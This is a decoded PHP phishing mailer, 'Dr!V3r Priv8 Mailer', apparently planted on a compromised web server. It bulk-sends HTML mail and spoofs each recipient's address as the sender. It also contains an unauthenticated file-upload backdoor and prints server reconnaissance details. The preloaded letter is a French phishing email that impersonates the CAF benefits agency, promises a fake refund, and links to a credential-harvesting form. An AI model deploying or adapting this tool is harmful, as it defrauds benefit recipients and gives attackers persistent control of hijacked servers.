/* Decoded by unphp.net */

<?php
$testa = $_POST['veio'];
if ($testa != "") {
    $message = $_POST['html'];
    $subject = $_POST['assunto'];
    $nome = $_POST['nome'];
    $de = $_POST['de'];
    $to = $_POST['emails'];
    $email = explode("
", $to);
    $message = stripslashes($message);
    $i = 0;
    $count = 1;
    while ($email[$i]) {
        $ok = "ok";
        $headers = "MIME-Version: 1.0
";
        $headers.= "Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: 7bit
X-Mailer: EDMAIL R6.00.02
Content-Length: 41061
";
        $headers.= "From: " . $email[$i] . "
";
        if (mail($email[$i], $subject, $message, $headers)) echo "<font color=gren>* N&#1098;mero: $count <b>" . $email[$i] . "</b> <font color=gren>Sent....!</font><br><hr>";
        else echo "<font color=red>* N&#1098;mero: $count <b>" . $email[$i] . "</b> <font color=red>Error in Sending ??</font><br><hr>";
        $i++;
        $count++;
    }
    $count--;
    if ($ok == "ok") echo "";
}
if ($_POST['_upl'] == "Upload") {
    if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo 'done';
    } else {
        echo 'failed';
    }
}
?>
<html>
<head>
<title>Dr!V3r Priv8 Mailer</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
body {
background: #eedfcc url(http://pekasemijoias.com.br/control-panel/images/image.png) no-repeat center top;
				-webkit-background-size: cover;
				-moz-background-size: cover;
				background-size: cover;
}
.titulo {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 70px;
    color: #D00C0C;
    font-weight: bold;
}

.normal {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 12px;
    color: #D00C0C;
}
.zebi {
	margin:0px;
}
.form {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 10px;
    color: #FFFFFF;
    background-color: #000000;
    border: 1px dashed #666666;
}

.texto {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-weight: bold;
}

.alerta {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-weight: bold;
    color: #990000;
    font-size: 10px;
}
</style>
</head>
<body align='center' >
<form action="" method="post" enctype="multipart/form-data" name="form1" align='center'>
  <input type="hidden" name="veio" value="sim">

    <tr>

 
<table align='center' width="53%" bordercolorlight="#000000" bordercolordark="#000000" style="border: 3px ridge #AB1E1E" bgcolor="black" > 
     <td width="462" height="25" align="center" bgcolor="#000000"><span class="titulo">DR!V3R KR VERSION</span></td>
<tr align="left"> 
<td colspan="2" ><font color="#AB1E1E">
Server Name: <?php echo $UNAME = @php_uname(); ?><br>
System: <?php echo $OS = @PHP_OS; ?><br>
Software : <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
Admin Mail: <?php echo $_SERVER['SERVER_ADMIN']; ?> <br>
Safe Mode: <?php echo $safe_mode = @ini_get('safe_mode'); ?> <br>
<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">
<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="UPLOAD"></form>

</td>

</center>


    </tr>
    <tr>
      <td height="194" valign="top" bgcolor="#000000">
          <table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="444">
          <tr>
            <td align="right" height="17"><span class="texto">Subject:</span></td>
            <td height="17"><input name="assunto" type="text" value="=?UTF-8?Q?=E2=9C=94_?= Support : Account need to update  =?UTF-8?Q?=E2=9C=89_?="class="form" id="assunto" style="width:100%" ></td>
          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="20" colspan="2" bgcolor="#000000"><span class="texto">Letter</span></td>
          </tr>
          <tr align="right">
            <td height="146" colspan="2" valign="top"><br>
             <textarea name="html" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="html">
<table width="578" border="0" cellpadding="0" cellspacing="0" align="center" style="line-height: 17px; color: rgb(42, 42, 42); font-family: Tahoma, Verdana, Arial, sans-serif; font-size: 13px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255)">
	<tbody style="line-height: 17px">
		<tr style="line-height: 17px">
			<td width="578" height="30" align="center" style="line-height: 17px">
			<font face="Arial, sans-serif" size="1" color="#000000" style="line-height: normal; font-size: 9px">
			Pour lire ce message en ligne, rendez-vous sur<span class="Apple-converted-space">&nbsp;</span><font color="#000000" style="line-height: normal">cette 
			page</font>.<br style="line-height: 11px">
			Ceci est un message automatique, merci de ne pas y repondre</font></td>
		</tr>
</table>
<table width="580" border="0" cellpadding="0" cellspacing="0" align="center" style="line-height: 17px; color: rgb(42, 42, 42); font-family: Tahoma, Verdana, Arial, sans-serif; font-size: 13px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; border: 1px solid rgb(0, 80, 177); background-color: rgb(255, 255, 255)">
	<tbody style="line-height: 17px">
		<tr style="line-height: 17px">
			<td width="133" valign="top" bgcolor="#FFFFFF" style="line-height: 17px">
			<table width="133" border="0" cellpadding="0" cellspacing="0" style="line-height: 17px">
				<tbody style="line-height: 17px">
					<tr style="line-height: 17px">
						<td valign="top" width="26" style="line-height: 17px">&nbsp;</td>
						<td width="79" valign="top" style="line-height: 17px">
						<img src="http://webe.emv3.com/cnaf_/20120822/DTR-RSA-Relance-ECARRT2/images/logo.jpg" alt="ALLOCATIONS FAMILIALES" width="79" height="80" border="0" style="line-height: 17px; display: block"></td>
						<td valign="top" width="28" style="line-height: 17px">&nbsp;</td>
					</tr>
			</table>
			</td>
			<td width="445" valign="top" style="line-height: 17px">
			<table width="445" border="0" cellpadding="0" cellspacing="0" style="line-height: 17px">
				<tbody style="line-height: 17px">
					<tr bgcolor="#0050B1" style="line-height: 17px">
						<td valign="top" width="50" height="80" style="line-height: 17px">&nbsp;</td>
						<td colspan="2" height="80" style="line-height: 17px">
						<font color="#FFFFFF" size="4" face="Arial, Helvetica, sans-serif" style="line-height: normal; font-size: 22px">
						Votre Caf vous informe sur :<span class="Apple-converted-space">&nbsp;</span><br style="line-height: 28px">
						vos </font><font style="line-height: normal; font-size: 22px" color="#FFFFFF" size="4" face="Arial, Helvetica, sans-serif">
						remboursements</font></td>
						<td valign="top" width="10" height="80" style="line-height: 17px">&nbsp;</td>
					</tr>
					<tr bgcolor="#0050B1" style="line-height: 17px">
						<td valign="top" style="line-height: 17px">
						<img src="http://webe.emv3.com/cnaf_/20120822/DTR-RSA-Relance-ECARRT2/images/spacer.gif" width="50" height="1" border="0" style="line-height: 17px"></td>
						<td valign="top" style="line-height: 17px">
						<img src="http://webe.emv3.com/cnaf_/20120822/DTR-RSA-Relance-ECARRT2/images/spacer.gif" width="317" height="1" border="0" style="line-height: 17px"></td>
						<td width="68" valign="top" style="line-height: 17px">
						<img src="http://webe.emv3.com/cnaf_/20120822/DTR-RSA-Relance-ECARRT2/images/spacer.gif" width="68" height="1" border="0" style="line-height: 17px"></td>
						<td valign="top" style="line-height: 17px">
						<img src="http://webe.emv3.com/cnaf_/20120822/DTR-RSA-Relance-ECARRT2/images/spacer.gif" width="10" height="1" border="0" style="line-height: 17px"></td>
					</tr>
					<tr bgcolor="#FFFFFF" style="line-height: 17px">
						<td valign="top" style="line-height: 17px">
						<img src="http://webe.emv3.com/cnaf_/20120822/DTR-RSA-Relance-ECARRT2/images/corner.jpg" width="50" height="49" border="0" style="line-height: 17px; display: block"></td>
						<td valign="top" width="317" height="49" style="line-height: 17px">&nbsp;</td>
						<td colspan="2" valign="top" style="line-height: 17px">
						<img src="http://webe.emv3.com/cnaf_/20120822/DTR-RSA-Relance-ECARRT2/images/logo2.jpg" alt="caf.fr" width="78" height="49" border="0" style="line-height: 17px; display: block; border: medium none"></td>
					</tr>
			</table>
			</td>
		</tr>
		<tr style="line-height: 17px">
			<td valign="top" bgcolor="#0050B1" style="line-height: 17px">
			<img src="http://webe.emv3.com/cnaf_/20120822/DTR-RSA-Relance-ECARRT2/images/visuel.jpg" width="133" height="453" border="0" style="line-height: 17px; display: block"></td>
			<td valign="top" style="line-height: 17px">
			<table width="445" border="0" cellpadding="0" cellspacing="0" style="line-height: 17px">
				<tbody style="line-height: 17px">
					<tr bgcolor="#FFFFFF" style="line-height: 17px">
						<td valign="top" width="44" height="415" style="line-height: 17px">&nbsp;</td>
						<td valign="top" width="393" height="415" style="line-height: 17px">
						<font color="#323232" size="1" face="Arial, Helvetica, sans-serif" style="line-height: normal; font-size: 12px">
						<br style="line-height: 15px">
						</font>
						<font color="#323232" face="Arial, Helvetica, sans-serif" style="line-height: normal; font-weight:bold">
						<span>Madame, Monsieur,&nbsp;<br style="line-height: 15px">
						</span></font>
						<font color="#323232" size="1" face="Arial, Helvetica, sans-serif" style="line-height: normal; font-size: 12px">
						<br style="line-height: 15px">
						</font>Apres les derniers calculs annuels de l'exercice de votre activite,<p style="color: rgb(51, 51, 51); font-family: Times New Roman; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 200%; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; margin-left: 0px; margin-right: 0px; margin-top: 10px; margin-bottom: 0px; background-color: rgb(255, 255, 255)">
nous avons determine que vous etes admissible a recevoir un remboursement de 
notre part d'un montant de 217,50 euros</p>
<p style="color: rgb(51, 51, 51); font-family: Times New Roman; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 200%; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; margin-left: 0px; margin-right: 0px; margin-top: 10px; margin-bottom: 0px; background-color: rgb(255, 255, 255)">
Priere de soumettre votre demande de remboursement et nous permettre de 7 jours 
ouvrables pour le traitement de votre situation,</p>
<p style="color: rgb(51, 51, 51); font-family: Times New Roman; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 200%; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; margin-left: 0px; margin-right: 0px; margin-top: 10px; margin-bottom: 0px; background-color: rgb(255, 255, 255)">
Pour acceder au formulaire de votre Compte , <a href="http://td645.cnawebdev.org/e.php">
<font color="#808000">Veuillez cliquez ici</font></a></p>
<p style="text-align:left">A bientot&nbsp; sur Caf.fr </p>
<p style="text-align:left">Votre caisse d'allocation familiales </p>
						<p>&nbsp;</td>
						<td valign="top" width="8" height="415" style="line-height: 17px">&nbsp;</td>
					</tr>
					<tr bgcolor="#FFFFFF" style="line-height: 17px">
						<td valign="top" width="8" style="line-height: 17px">&nbsp;</td>
					</tr>
			</table>
			</td>
		</tr>
		<tr bgcolor="#0050B1" style="line-height: 17px">
			<td colspan="2" align="center" height="90" style="line-height: 17px">
			<font color="#FFFFFF" size="4" face="Arial, Helvetica, sans-serif" style="line-height: normal; font-size: 11px">
			<font color="#FFFFFF" style="line-height: normal; text-decoration:underline; font-weight:700">Mentions legales</font><br style="line-height: 14px">
			<br style="line-height: 14px">
			Vous recevez ce message car vous nous avez communique votre adresse 
			electronique..<span class="Apple-converted-space">&nbsp;</span><br style="line-height: 14px">
			Si vous ne souhaitez plus recevoir de courriel de votre Caf, 
			veuillez effacer votre adresse e-mail<span class="Apple-converted-space">&nbsp;</span><br style="line-height: 14px">
			dans l'espace &quot;Mon Compte&quot; du site<span class="Apple-converted-space">&nbsp;</span><a title="www.caf.fr" target="_blank" style="line-height: 14px; font-weight: inherit; text-decoration: underline; color: rgb(255, 255, 255); cursor: pointer" href="http://courriel.caf.fr/HS?a=ENX7CqqdlqtK8SA9MKJVCxLnGHxKLrfxUPcStGb5lw8W0bBhOG5mpqVsje_Hhe-uL1IR"><font color="#FFFFFF" style="line-height: normal">www.caf.fr</font></a></font></td>
		</tr>
</table>
<img src="http://courriel.caf.fr/HO?DdX7CqqdlqtK8SA9MOPQKPbnGHxKLIcjIgjtS5kGfgDiKKY.gif" border="0" alt="" width="1" height="1" style="line-height: 17px; color: rgb(42, 42, 42); font-family: Tahoma, Verdana, Arial, sans-serif; font-size: 13px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255)">
</textarea>
              <span class="alerta">*Letter HTML</span></td>



          </tr>
          <tr align="center" bgcolor="#000000">
            <td height="10" colspan="2"><span class="texto">Mail List</span>
             
          </tr>
          <tr align="right">
            <td height="136" colspan="2" valign="top"><br>
              <textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="emails">
              	
</textarea>
              <span class="alerta">* Maillist</span> </td>
          </tr>
          <tr>
            <td height="26" align="right" valign="top" colspan="2"><input type="submit" name="Submit" value="Enviar"></td>
          </tr>
        </table>
      </td>
    </tr>
    <tr>
      <td height="15" align="center" bgcolor="#000000">&nbsp;</td>
    </tr>
  </table>
</form>
</body>